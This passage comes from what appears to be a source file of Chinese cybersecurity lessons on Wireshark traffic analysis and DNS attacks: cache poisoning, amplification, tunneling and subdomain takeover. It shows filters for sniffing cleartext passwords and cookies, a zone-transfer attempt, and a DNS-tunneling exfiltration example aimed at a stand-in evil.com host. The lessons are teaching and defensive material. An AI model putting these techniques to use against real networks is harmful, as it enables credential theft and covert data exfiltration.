              │\r\n  │   Class: IN (0x0001)                          │\r\n  └───────────────────────────────────────────────┘\r\n\r\n  No.  Time     Source         Dest           Protocol  Info\r\n  2    0.023    8.8.8.8        192.168.1.100  DNS       Standard query response A 93.184.216.34\r\n\r\n  DNS 响应详情:\r\n  ┌───────────────────────────────────────────────┐\r\n  │ Transaction ID: 0xa1b2  (匹配!)               │\r\n  │ Flags: 0x8180 Standard query response         │\r\n  │ Answers: 1                                    │\r\n  │ Answers:                                      │\r\n  │   Name: example.com                           │\r\n  │   Type: A                                     │\r\n  │   TTL: 3600                                   │\r\n  │   Address: 93.184.216.34                      │\r\n  └───────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h3>第二步：TCP 三次握手</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  使用过滤器: tcp.port == 80 and ip.addr == 93.184.216.34\r\n\r\n  No.  Time       Source          Destination      Info\r\n  3    0.025      192.168.1.100   93.184.216.34    [SYN] Seq=0\r\n  4    0.168      93.184.216.34   192.168.1.100    [SYN, ACK] Seq=0 Ack=1\r\n  5    0.169      192.168.1.100   93.184.216.34    [ACK] Seq=1 Ack=1\r\n</code></pre></div>\r\n\r\n<h3>第三步：HTTP 请求与响应</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  使用过滤器: http\r\n\r\n  No.  Time     Source          Destination      Info\r\n  6    0.170    192.168.1.100   93.184.216.34    GET / HTTP/1.1\r\n  7    0.312    93.184.216.34   192.168.1.100    HTTP/1.1 200 OK\r\n\r\n  完整 HTTP 请求:\r\n  ┌─────────────────────────────────────────────┐\r\n  │ GET / HTTP/1.1                              │\r\n  │ Host: example.com                           │\r\n  │ User-Agent: Mozilla/5.0 ...                 │\r\n  │ Accept: text/html ...                       │\r\n  │ Connection: keep-alive                      │\r\n  └─────────────────────────────────────────────┘\r\n\r\n  完整 HTTP 响应:\r\n  ┌─────────────────────────────────────────────┐\r\n  │ HTTP/1.1 200 OK                             │\r\n  │ Content-Type: text/html                     │\r\n  │ Content-Length: 1256                        │\r\n  │ Server: ECS (dab/0F1B)                      │\r\n  │ Last-Modified: Mon, 12 Jun 2023 00:00:00    │\r\n  │                                             │\r\n  │ &lt;!doctype html&gt;                             │\r\n  │ &lt;html&gt;                                      │\r\n  │ &lt;head&gt;&lt;title&gt;Example Domain&lt;/title&gt;...      │\r\n  └─────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h3>第四步：TCP 四次挥手</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  使用过滤器: tcp.port == 80 and ip.addr == 93.184.216.34\r\n\r\n  No.  Time       Source          Destination      Info\r\n  8    1.170      192.168.1.100   93.184.216.34    [FIN, ACK] Seq=356\r\n  9    1.312      93.184.216.34   192.168.1.100    [ACK] Ack=357\r\n  10   1.313      93.184.216.34   192.168.1.100    [FIN, ACK] Seq=1257\r\n  11   1.314      192.168.1.100   93.184.216.34    [ACK] Ack=1258\r\n</code></pre></div>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>在 Wireshark 中，你可以右键点击任何一个包 &gt; \"Follow\" &gt; \"TCP Stream\" 或 \"HTTP Stream\"，这样可以用彩色高亮显示完整的会话数据——红色是客户端发送的，蓝色是服务器返回的。这比逐包查看高效得多。</p></div>\r\n\r\n<h2>实战场景二：检测可疑的端口扫描</h2>\r\n\r\n<p>假设你的 IDS 报警说可能有端口扫描正在进行。用 Wireshark 来确认：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 第一步: 查找大量不同的目标端口\r\n# 过滤器: 只看 SYN 包 (不含 ACK)\r\ntcp.flags.syn == 1 and tcp.flags.ack == 0\r\n\r\n# 第二步: 用 Statistics &gt; Conversations &gt; TCP 查看\r\n# 哪些 IP 连接了最多的端口\r\n\r\n# 第三步: 用以下过滤器聚焦可疑 IP\r\nip.src == 10.0.0.50 and tcp.flags.syn == 1 and tcp.flags.ack == 0\r\n\r\n# 第四步: 检查是否收到 RST 回复 (表示端口关闭)\r\nip.src == 10.0.0.50 and tcp.flags.reset == 1\r\n</code></pre></div>\r\n\r\n<p>一个典型的端口扫描流量长这样：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  No.  Time   Source      Destination  Info\r\n  1    0.000  10.0.0.50   10.0.0.1    54321 &gt; 22   [SYN] Seq=0\r\n  2    0.001  10.0.0.1    10.0.0.50   22 &gt; 54321   [SYN, ACK]  (端口开放!)\r\n  3    0.001  10.0.0.50   10.0.0.1    54322 &gt; 23   [SYN] Seq=0\r\n  4    0.002  10.0.0.1    10.0.0.50   23 &gt; 54322   [RST, ACK]  (端口关闭)\r\n  5    0.002  10.0.0.50   10.0.0.1    54323 &gt; 25   [SYN] Seq=0\r\n  6    0.003  10.0.0.1    10.0.0.50   25 &gt; 54323   [RST, ACK]  (端口关闭)\r\n  7    0.003  10.0.0.50   10.0.0.1    54324 &gt; 80   [SYN] Seq=0\r\n  8    0.004  10.0.0.1    10.0.0.50   80 &gt; 54324   [SYN, ACK]  (端口开放!)\r\n  9    0.004  10.0.0.50   10.0.0.1    54325 &gt; 443  [SYN] Seq=0\r\n  10   0.005  10.0.0.1    10.0.0.50   443 &gt; 54325  [SYN, ACK]  (端口开放!)\r\n  ...  (继续扫描数百个端口)\r\n\r\n  特征:\r\n  - 同一源 IP 在极短时间内扫描大量端口\r\n  - 每个连接使用不同的源端口\r\n  - 大量 RST 回复 (端口关闭)\r\n  - 没有后续的 ACK (半开扫描, SYN Scan)\r\n</code></pre></div>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">安全分析</div><p>注意包 1 和包 3 的时间差只有 0.001 秒——正常用户不可能这么快发起连接。Nmap 的默认 SYN 扫描速率可以达到每秒数千个包。在 Wireshark 中，你可以用 <code>Statistics &gt; I/O Graphs</code> 来可视化流量模式。</p></div>\r\n\r\n<h2>实战场景三：提取传输中的敏感信息</h2>\r\n\r\n<p>HTTP 是明文协议——所有传输的数据都可以被抓包工具直接读取。让我们看看能提取到什么：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 查找 HTTP 登录请求 (POST 到 login 相关 URL)\r\nhttp.request.method == \"POST\" and http.request.uri contains \"login\"\r\n\r\n# 查找包含密码字段的数据\r\nhttp contains \"password\"\r\n\r\n# 查找 HTTP Basic 认证 (Base64 编码的凭证)\r\nhttp.authorization\r\n\r\n# 查找 Cookie\r\nhttp.cookie contains \"session\"\r\n\r\n# 查找特定文件类型的传输\r\nhttp.response.code == 200 and http.content_type contains \"json\"\r\n</code></pre></div>\r\n\r\n<p>一个典型的登录请求抓包结果：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  POST /api/login HTTP/1.1\r\n  Host: vulnerable-app.local\r\n  Content-Type: application/x-www-form-urlencoded\r\n  Content-Length: 35\r\n  Cookie: PHPSESSID=abc123def456\r\n\r\n  username=admin&amp;password=P@ssw0rd!\r\n\r\n  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  明文密码! 这就是为什么 HTTPS 如此重要\r\n</code></pre></div>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">安全视角</div><p>在公共 Wi-Fi 环境下，攻击者可以用 Wireshark 或 tcpdump 轻松捕获同一网络中所有 HTTP 流量中的密码、Cookie、API Token。这就是为什么<strong>所有网站都应该使用 HTTPS</strong>，并且启用 HSTS。</p></div>\r\n\r\n<h2>Wireshark 高级技巧</h2>\r\n\r\n<h3>跟随 TCP 流并导出数据</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 右键点击任意包 &gt; Follow &gt; TCP Stream\r\n# 在弹出窗口中:\r\n# - 选择 \"Show data as: Raw\" 查看原始十六进制\r\n# - 选择 \"Show data as: ASCII\" 查看文本\r\n# - 选择 \"Show data as: UTF-8\" 查看 Unicode\r\n# - 用 \"Save as...\" 导出数据到文件\r\n\r\n# 使用 tshark 命令行导出特定流:\r\ntshark -r capture.pcap -q -z follow,tcp,ascii,0\r\n# -z follow,tcp,ascii,0 : 导出第一个 TCP 流\r\n</code></pre></div>\r\n\r\n<h3>使用 Expert Information 快速发现问题</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Analyze &gt; Expert Information 面板:\r\n\r\n  ┌───────────────────────────────────────────────┐\r\n  │ Expert Information                            │\r\n  │                                               │\r\n  │ [!] Warnings (黄色):                          │\r\n  │   TCP Retransmission: 23                      │\r\n  │   TCP Fast Retransmission: 5                  │\r\n  │   TCP Dup ACK: 12                             │\r\n  │                                               │\r\n  │ [i] Notes (蓝色):                             │\r\n  │   TCP Window Full: 3                          │\r\n  │   TCP Out of Order: 8                         │\r\n  │                                               │\r\n  │ [x] Errors (红色):                            │\r\n  │   TCP Previous segment not captured: 2        │\r\n  │   Malformed Packet: 1          &lt;-- 可疑!     │\r\n  └───────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>红色错误和黄色警告是安全分析的重点：</p>\r\n<ul>\r\n  <li><strong>Retransmission</strong>：正常网络偶尔有，大量重传可能表示中间人在干扰</li>\r\n  <li><strong>Malformed Packet</strong>：畸形包可能意味着攻击流量或协议实现 bug</li>\r\n  <li><strong>Previous segment not captured</strong>：你可能丢失了数据包，或者有人在注入数据</li>\r\n</ul>\r\n\r\n<h3>自定义列和着色规则</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 添加自定义列 (Edit &gt; Preferences &gt; Columns):\r\n# 名称: \"HTTP Method\"\r\n# 类型: Custom\r\n# 字段: http.request.method\r\n\r\n# 名称: \"HTTP Status\"\r\n# 类型: Custom\r\n# 字段: http.response.code\r\n\r\n# 名称: \"DNS Query\"\r\n# 类型: Custom\r\n# 字段: dns.qry.name\r\n\r\n# 着色规则 (View &gt; Coloring Rules):\r\n# 红色: tcp.flags.reset == 1  (RST 包)\r\n# 黄色: tcp.analysis.retransmission  (重传)\r\n# 绿色: http.request  (HTTP 请求)\r\n# 蓝色: dns  (DNS 查询)\r\n</code></pre></div>\r\n\r\n<h2>使用 tshark 进行批量分析</h2>\r\n\r\n<p>当你需要自动化处理大量 pcap 文件时，tshark 命令行比 Wireshark GUI 更高效：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 统计所有 HTTP 请求的 URL\r\ntshark -r capture.pcap -Y \"http.request\" -T fields \\\r\n  -e ip.src -e http.host -e http.request.uri\r\n\r\n# 输出示例:\r\n# 192.168.1.100  example.com  /index.html\r\n# 192.168.1.100  example.com  /login\r\n# 192.168.1.100  api.example.com  /v1/users\r\n\r\n# 统计所有 DNS 查询的域名\r\ntshark -r capture.pcap -Y \"dns.qry.type == 1\" -T fields \\\r\n  -e dns.qry.name | sort | uniq -c | sort -rn | head -20\r\n\r\n# 提取所有 HTTP 响应状态码\r\ntshark -r capture.pcap -Y \"http.response\" -T fields \\\r\n  -e http.response.code -e http.response.phrase | sort | uniq -c\r\n\r\n# 生成通信对话统计\r\ntshark -r capture.pcap -q -z conv,tcp\r\n\r\n# 将 pcap 转为 JSON 格式 (方便程序处理)\r\ntshark -r capture.pcap -T json -Y \"http\" &gt; http_traffic.json\r\n</code></pre></div>\r\n\r\n<h2>动手实验清单</h2>\r\n\r\n<p>按照以下步骤完成本节实验：</p>\r\n\r\n<ol>\r\n  <li>打开 Wireshark，选择正确接口开始捕获</li>\r\n  <li>在浏览器中访问 <code>http://example.com</code>（一个 HTTP 网站）</li>\r\n  <li>使用 <code>dns.qry.name == \"example.com\"</code> 过滤 DNS 查询</li>\r\n  <li>使用 <code>tcp.port == 80</code> 查看 TCP 三次握手</li>\r\n  <li>使用 <code>http</code> 过滤器查看请求和响应</li>\r\n  <li>右键 &gt; Follow TCP Stream，保存完整会话</li>\r\n  <li>尝试用 tshark 命令提取 URL 和状态码</li>\r\n</ol>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 额外挑战: 用 tcpdump 抓取并保存流量\r\ntcpdump -i eth0 -w capture.pcap -c 1000 port 80\r\n\r\n# 然后用 Wireshark 打开 capture.pcap 进行分析\r\nwireshark capture.pcap\r\n</code></pre></div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(1)\">▶ 端口扫描器</button>\r\n\r\n<div class=\"callout default\"><div class=\"callout-title\">小结</div><p>Wireshark 的核心能力是：(1) 捕获过滤器决定你抓什么，(2) 显示过滤器决定你看什么，(3) Follow Stream 让你看到完整会话。掌握这三点，你就能分析任何网络流量。</p></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"6\"></div>\r\n<div class=\"checkpoint\" data-cp=\"7\"></div>\r\n<div class=\"checkpoint\" data-cp=\"8\"></div>\r\n\r\n</section>";
+
+SECTION_CONTENT["net-03"] = "<section id=\"net-03\" data-content-key=\"net-03\" data-chapter=\"net-03\">\r\n\r\n<div class=\"section-transition\"><p>Wireshark 让我们看到了数据包的全貌——但有一个协议我们只是一带而过：DNS。每个 HTTP 请求之前都有一个 DNS 查询，而 DNS 协议的安全性长期以来被严重低估。在这一节，我们将深入 DNS 的协议细节和攻击面。</p></div>\r\n\r\n<h1>DNS 协议与攻击面：域名系统的暗面</h1>\r\n\r\n<p>当你在浏览器中输入 <code>cyberedu.cn</code> 时，在你的 HTTP 请求发出之前，有一场你看不到的\"幕后交易\"正在进行——<strong>DNS 解析</strong>。DNS（Domain Name System）将人类可读的域名转换为机器可路由的 IP 地址。它被称为\"互联网的电话号码簿\"。</p>\r\n\r\n<p>但这个\"电话号码簿\"有三个致命的设计缺陷：<strong>它是明文的、它是无状态的、它默认不验证</strong>。这些缺陷催生了一系列严重的安全威胁。</p>\r\n\r\n<h2>DNS 查询的完整旅程</h2>\r\n\r\n<p>让我们追踪一次真实的 DNS 查询——从你的电脑到最终获得 IP 地址的完整过程：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  你的电脑                本地 DNS               根服务器        .cn TLD       cyberedu.cn\r\n  (192.168.1.100)        (8.8.8.8)              (a.root)        (ns.cn)       (ns1.cyberedu.cn)\r\n       │                      │                     │              │               │\r\n       │ ① \"cyberedu.cn?\"    │                     │              │               │\r\n       │ ───────────────────&gt; │                     │              │               │\r\n       │                      │                     │              │               │\r\n       │                      │ ② \"cyberedu.cn?\"   │              │               │\r\n       │                      │ ──────────────────&gt; │              │               │\r\n       │                      │                     │              │               │\r\n       │                      │ ③ \"去问 .cn TLD\"   │              │               │\r\n       │                      │ &lt;────────────────── │              │               │\r\n       │                      │                     │              │               │\r\n       │                      │ ④ \"cyberedu.cn?\"                   │               │\r\n       │                      │ ──────────────────────────────────&gt;│               │\r\n       │                      │                                    │               │\r\n       │                      │ ⑤ \"去问 ns1.cyberedu.cn\"           │               │\r\n       │                      │ &lt;──────────────────────────────────│               │\r\n       │                      │                                    │               │\r\n       │                      │ ⑥ \"cyberedu.cn?\"                                   │\r\n       │                      │ ──────────────────────────────────────────────────&gt;│\r\n       │                      │                                                    │\r\n       │                      │ ⑦ \"203.0.113.50, TTL=3600\"                         │\r\n       │                      │ &lt;──────────────────────────────────────────────────│\r\n       │                      │                                    │               │\r\n       │ ⑧ \"203.0.113.50\"    │                     │              │               │\r\n       │ &lt;─────────────────── │                     │              │               │\r\n       │                      │                     │              │               │\r\n</code></pre></div>\r\n\r\n<p>看到了吗？一个看似简单的域名解析，实际上经历了<strong>递归查询</strong>和<strong>迭代查询</strong>两个阶段，跨越了四个不同的 DNS 服务器。</p>\r\n\r\n<h2>DNS 数据包结构深度解析</h2>\r\n\r\n<p>让我们在 Wireshark 中看看 DNS 查询和响应的真实数据包：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  使用过滤器: dns.qry.name == \"cyberedu.cn\"\r\n\r\n  ===== DNS 查询 (客户端 &gt; DNS 服务器) =====\r\n  Domain Name System (query)\r\n  ┌─────────────────────────────────────────────────────────────┐\r\n  │ Transaction ID: 0x7a3b                                      │\r\n  │ Flags: 0x0100                                               │\r\n  │   0... .... .... .... = Response: Message is a query        │\r\n  │   .000 0... .... .... = Opcode: Standard query (0)          │\r\n  │   .... ..0. .... .... = Truncated: Not truncated            │\r\n  │   .... ...1 .... .... = Recursion desired: Yes              │\r\n  │   .... .... .0.. .... = Z: Reserved (0)                     │\r\n  │   .... .... ...0 .... = Non-authenticated data: Unacceptable│\r\n  │ Questions: 1                                                │\r\n  │ Answer RRs: 0                                               │\r\n  │ Authority RRs: 0                                            │\r\n  │ Additional RRs: 0                                           │\r\n  │                                                             │\r\n  │ Queries:                                                    │\r\n  │   cyberedu.cn: type A, class IN                             │\r\n  │     Name: cyberedu.cn                                       │\r\n  │     [Name Length: 11]                                       │\r\n  │     [Label Count: 2]                                        │\r\n  │     Type: A (Host Address) (1)                              │\r\n  │     Class: IN (0x0001)                                      │\r\n  └─────────────────────────────────────────────────────────────┘\r\n\r\n  ===== DNS 响应 (DNS 服务器 &gt; 客户端) =====\r\n  Domain Name System (response)\r\n  ┌─────────────────────────────────────────────────────────────┐\r\n  │ Transaction ID: 0x7a3b   (与查询匹配!)                      │\r\n  │ Flags: 0x8180                                               │\r\n  │   1... .... .... .... = Response: Message is a response     │\r\n  │   .000 0... .... .... = Opcode: Standard query (0)          │\r\n  │   .... ...1 .... .... = Recursion desired: Yes              │\r\n  │   .... .... .... 0... = Reply code: No error (0)            │\r\n  │ Questions: 1                                                │\r\n  │ Answer RRs: 1                                               │\r\n  │                                                             │\r\n  │ Answers:                                                    │\r\n  │   cyberedu.cn: type A, class IN, addr 203.0.113.50          │\r\n  │     Name: cyberedu.cn                                       │\r\n  │     Type: A (Host Address) (1)                              │\r\n  │     Class: IN (0x0001)                                      │\r\n  │     Time to live: 3600 (1 hour)                             │\r\n  │     Data length: 4                                          │\r\n  │     Address: 203.0.113.50                                   │\r\n  └─────────────────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>十六进制原始数据：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  DNS Query hex dump (UDP payload):\r\n  0000  7a 3b 01 00 00 01 00 00 00 00 00 00 08 63 79 62  z;...........cyb\r\n  0010  65 72 65 64 75 02 63 6e 00 00 01 00 01           ered.u.cn.....\r\n\r\n  解读:\r\n  7a 3b       Transaction ID\r\n  01 00       Flags: Standard query, RD=1\r\n  00 01       Questions: 1\r\n  00 00       Answers: 0\r\n  00 00       Authority: 0\r\n  00 00       Additional: 0\r\n  08          Label length: 8 (\"cyberedu\")\r\n  63 79 62... \"cyberedu\"\r\n  02          Label length: 2 (\"cn\")\r\n  63 6e       \"cn\"\r\n  00          End of name (root label)\r\n  00 01       Type: A\r\n  00 01       Class: IN\r\n</code></pre></div>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>注意 DNS 中域名的编码方式：每个标签（label）前面有一个长度字节。<code>cyberedu.cn</code> 被编码为 <code>08 cyberedu 02 cn 00</code>。末尾的 <code>00</code> 表示根域名。这种编码在 DNS 压缩攻击中会被利用。</p></div>\r\n\r\n<h2>DNS 记录类型全览</h2>\r\n\r\n<p>DNS 不只是做 A 记录（域名到 IP）的映射。安全从业者必须了解所有关键记录类型：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌────────┬──────────────────────────┬───────────────────────────────────┐\r\n  │ 类型   │ 说明                     │ 安全相关性                        │\r\n  ├────────┼──────────────────────────┼───────────────────────────────────┤\r\n  │ A      │ 域名 &gt; IPv4 地址        │ 基本解析，缓存投毒目标            │\r\n  │ AAAA   │ 域名 &gt; IPv6 地址        │ 同上                              │\r\n  │ CNAME  │ 域名 &gt; 另一个域名       │ 子域名接管攻击                    │\r\n  │ MX     │ 邮件服务器               │ 邮件劫持                        │\r\n  │ NS     │ 权威名称服务器           │ DNS 劫持的核心                    │\r\n  │ TXT    │ 任意文本                 │ SPF/DKIM/DMARC 伪造             │\r\n  │ SOA    │ 区域授权起始             │ 序列号用于区域传输                │\r\n  │ PTR    │ IP &gt; 域名 (反向)        │ 信息泄露                        │\r\n  │ SRV    │ 服务定位                 │ 服务发现                        │\r\n  └────────┴──────────────────────────┴───────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h2>DNS 攻击面全景</h2>\r\n\r\n<h3>攻击一：DNS 缓存投毒 (Cache Poisoning)</h3>\r\n\r\n<p>这是 DNS 最经典的攻击之一。攻击者向递归 DNS 服务器注入伪造的解析结果，使所有使用该 DNS 服务器的用户都被导向恶意 IP：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  正常 DNS 解析:\r\n  用户 &gt; DNS 服务器: \"cyberedu.cn 的 IP 是什么?\"\r\n  DNS &gt; 权威服务器: \"cyberedu.cn 的 IP 是什么?\"\r\n  权威 &gt; DNS: \"203.0.113.50\"\r\n  DNS 缓存: cyberedu.cn &gt; 203.0.113.50 (TTL=3600)\r\n  用户访问: 203.0.113.50 (正确的服务器)\r\n\r\n  DNS 缓存投毒攻击:\r\n  攻击者同时向 DNS 服务器发送大量伪造响应:\r\n  ┌────────────────────────────────────────────────────────┐\r\n  │ 伪造响应 #1: Transaction ID=0x0001, IP=6.6.6.6        │\r\n  │ 伪造响应 #2: Transaction ID=0x0002, IP=6.6.6.6        │\r\n  │ 伪造响应 #3: Transaction ID=0x0003, IP=6.6.6.6        │\r\n  │ ...                                                    │\r\n  │ 伪造响应 #65535: Transaction ID=0xFFFF, IP=6.6.6.6    │\r\n  │                                                        │\r\n  │ 如果伪造响应在合法响应之前到达，                         │\r\n  │ 且 Transaction ID 和源端口都匹配:                       │\r\n  │ DNS 缓存: cyberedu.cn &gt; 6.6.6.6 (攻击者的 IP!)        │\r\n  └────────────────────────────────────────────────────────┘\r\n\r\n  用户访问: 6.6.6.6 (钓鱼网站!)\r\n</code></pre></div>\r\n\r\n<p>攻击成功需要猜对两个值：</p>\r\n<ul>\r\n  <li><strong>Transaction ID (16 bit)</strong>：65536 种可能</li>\r\n  <li><strong>UDP 源端口 (16 bit)</strong>：65536 种可能</li>\r\n</ul>\r\n<p>总共 2^32 = 约 43 亿种组合。Dan Kaminsky 在 2008 年提出了一种高效的投毒方法，通过查询不存在的子域名来强制递归查询，大幅提高攻击成功率。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 检查你的 DNS 服务器是否容易受到缓存投毒:\r\n# 1. 查看源端口是否随机化\r\nfor i in $(seq 1 20); do\r\n  dig +short +norecurse @your-dns-server porttest.dns-oarc.net txt\r\ndone\r\n\r\n# 如果源端口都是同一个值 = 极度危险!\r\n# 如果源端口是递增的 = 可预测，仍然危险\r\n# 如果源端口完全随机 = 安全\r\n</code></pre></div>\r\n\r\n<h3>攻击二：DNS 放大攻击 (Amplification DDoS)</h3>\r\n\r\n<p>攻击者利用开放的 DNS 递归服务器发起 DDoS 攻击。原理是利用 DNS 响应远大于请求的<strong>放大效应</strong>：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  放大比计算:\r\n\r\n  请求 (伪造源IP为受害者):\r\n  ┌──────────────────────────────────┐\r\n  │ DNS Query: \"ANY example.com\"     │  约 60 字节\r\n  │ Source IP: 受害者 (伪造)          │\r\n  └──────────────────────────────────┘\r\n\r\n  响应 (发往受害者):\r\n  ┌──────────────────────────────────────────────────────────┐\r\n  │ DNS Response:                                            │\r\n  │   A:    93.184.216.34                                    │\r\n  │   AAAA: 2606:2800:220:1:248:1893:25c8:1946              │\r\n  │   MX:   mail.example.com                                 │\r\n  │   NS:   ns1.example.com, ns2.example.com                 │\r\n  │   TXT:  \"v=spf1 -all\"                                    │\r\n  │   SOA:  ns1.example.com admin.example.com ...            │\r\n  │                                                          │\r\n  │ 约 4000 字节!                                            │  约 4000 字节\r\n  └──────────────────────────────────────────────────────────┘\r\n\r\n  放大比: 4000 / 60 ≈ 66x\r\n\r\n  攻击者用 1 Mbps 的带宽 &gt; 受害者收到 66 Mbps 的攻击流量!\r\n</code></pre></div>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">防御者必读</div><p>防御 DNS 放大攻击的关键是：(1) 关闭开放递归（只允许内部用户使用递归查询）；(2) 实施响应速率限制（Response Rate Limiting）；(3) 部署 BCP38 入口过滤，防止源 IP 欺骗。</p></div>\r\n\r\n<h3>攻击三：DNS 隧道 (DNS Tunneling)</h3>\r\n\r\n<p>DNS 隧道利用 DNS 查询来传输非 DNS 数据，绕过防火墙和上网行为管理。因为大多数防火墙允许 DNS 流量通过（否则整个互联网就没法用了），攻击者可以利用这个\"白名单\"通道来偷数据：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  正常 DNS 查询:\r\n  Q: \"www.cyberedu.cn\" &gt; 203.0.113.50\r\n\r\n  DNS 隧道 (数据窃取):\r\n  Q: \"c2VjcmV0LWRhdGE=.exfil.evil.com\" &gt; 攻击者的 DNS 服务器\r\n       ^^^^^^^^^^^^^^^^^^^\r\n       Base64 编码的窃取数据: \"secret-data\"\r\n\r\n  攻击者的 DNS 服务器回复:\r\n  A: TXT \"Y29tbWFuZDogZG93bmxvYWQ=\" (Base64 编码的命令)\r\n       ^^^^^^^^^^^^^^^^^^^^^^^^^\r\n       解码: \"command: download\"\r\n\r\n  每次查询可以传输约 200 字节\r\n  每秒 10 次查询 = 2 KB/s 的隐蔽通道\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 检测 DNS 隧道的 Wireshark 过滤器:\r\n\r\n# 1. 超长的 DNS 查询名 (正常域名很少超过 50 字符)\r\ndns.qry.name.len &gt; 50\r\n\r\n# 2. 查询频率异常高\r\n# Statistics &gt; Conversations &gt; DNS 标签页\r\n\r\n# 3. 大量 TXT 记录查询 (隧道常用)\r\ndns.qry.type == 16\r\n\r\n# 4. 查询的子域名看起来像随机字符串\r\n# (需要正则匹配或手动观察)\r\ndns.qry.name matches \".*[a-z0-9]{20,}.*\"\r\n\r\n# 使用 tshark 统计 DNS 查询长度:\r\ntshark -r capture.pcap -Y \"dns\" -T fields \\\r\n  -e dns.qry.name.len -e dns.qry.name | sort -rn | head -20\r\n</code></pre></div>\r\n\r\n<h3>攻击四：子域名接管 (Subdomain Takeover)</h3>\r\n\r\n<p>当一个 CNAME 记录指向已经被删除或释放的第三方服务时，攻击者可以注册该服务并接管这个子域名：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  场景: cyberedu.cn 曾经使用 GitHub Pages\r\n\r\n  DNS 记录:\r\n  blog.cyberedu.cn  CNAME  cyberedu.github.io\r\n\r\n  后来团队不再维护 blog:\r\n  1. 删除了 GitHub 上的 cyberedu.github.io 仓库\r\n  2. 但忘记删除 DNS 中的 CNAME 记录!\r\n\r\n  攻击者操作:\r\n  1. 发现 blog.cyberedu.cn CNAME 到一个不存在的 GitHub Pages\r\n  2. 在 GitHub 上创建一个名为 cyberedu.github.io 的仓库\r\n  3. 启用 GitHub Pages\r\n  4. 现在 blog.cyberedu.cn 指向攻击者控制的内容!\r\n\r\n  检测方法:\r\n  dig blog.cyberedu.cn CNAME\r\n  # blog.cyberedu.cn. 3600 IN CNAME cyberedu.github.io.\r\n\r\n  curl -I https://cyberedu.github.io\r\n  # 如果返回 404 = 存在子域名接管风险!\r\n</code></pre></div>\r\n\r\n<h2>动手实验：用 dig 追踪 DNS 解析</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 1. 追踪完整的 DNS 解析过程 (+trace):\r\ndig +trace cyberedu.cn\r\n\r\n# 输出会显示从根服务器到权威服务器的每一步\r\n\r\n# 2. 查询不同类型的记录:\r\ndig cyberedu.cn A           # IPv4 地址\r\ndig cyberedu.cn AAAA        # IPv6 地址\r\ndig cyberedu.cn MX          # 邮件服务器\r\ndig cyberedu.cn NS          # 权威名称服务器\r\ndig cyberedu.cn TXT         # TXT 记录 (SPF 等)\r\ndig cyberedu.cn SOA         # 区域授权\r\n\r\n# 3. 指定 DNS 服务器:\r\ndig @8.8.8.8 cyberedu.cn              # Google DNS\r\ndig @1.1.1.1 cyberedu.cn              # Cloudflare DNS\r\ndig @ns1.cyberedu.cn cyberedu.cn      # 权威服务器\r\n\r\n# 4. 反向查询 (IP &gt; 域名):\r\ndig -x 203.0.113.50\r\n\r\n# 5. 尝试区域传输 (通常会被拒绝):\r\ndig @ns1.cyberedu.cn cyberedu.cn AXFR\r\n# 如果成功 = 严重信息泄露! 攻击者将获得所有子域名\r\n\r\n# 6. 在 Wireshark 中同时抓包观察:\r\n#    打开 Wireshark 捕获，然后在另一个终端执行 dig 命令\r\n</code></pre></div>\r\n\r\n<h2>DNSSEC：DNS 的安全补丁</h2>\r\n\r\n<p>DNSSEC（DNS Security Extensions）通过数字签名来验证 